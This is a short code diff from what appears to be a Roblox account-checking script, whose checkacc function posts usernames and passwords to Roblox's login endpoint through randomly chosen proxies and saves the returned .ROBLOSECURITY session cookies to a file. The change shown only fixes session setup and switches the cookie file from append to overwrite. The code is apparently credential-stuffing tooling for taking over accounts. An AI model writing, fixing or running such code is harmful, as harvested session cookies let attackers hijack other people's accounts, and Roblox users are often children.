@@ -38,8 +38,8 @@ def getbot():
       
 def checkacc(name,passs):
     try:
-        if proxiees == True:
-            session = requests.Session()           
+        session = requests.Session()    
+        if proxiees == True:                 
             proxyee = proxye.splitlines()
             ex = random.choice(proxyee)
             proxy = {"http": ex, "https": ex}
@@ -58,7 +58,7 @@ def checkacc(name,passs):
         response = session.post('https://auth.roblox.com/v2/login', headers=headers, data=data)
         print(response.json())
         cookie = session.cookies['.ROBLOSECURITY']
-        with open ('cookies.txt','a') as file:
+        with open ('cookies.txt','w') as file:
             file.write(cookie + '\n')
     except:
        print('error logging in noob LOL')
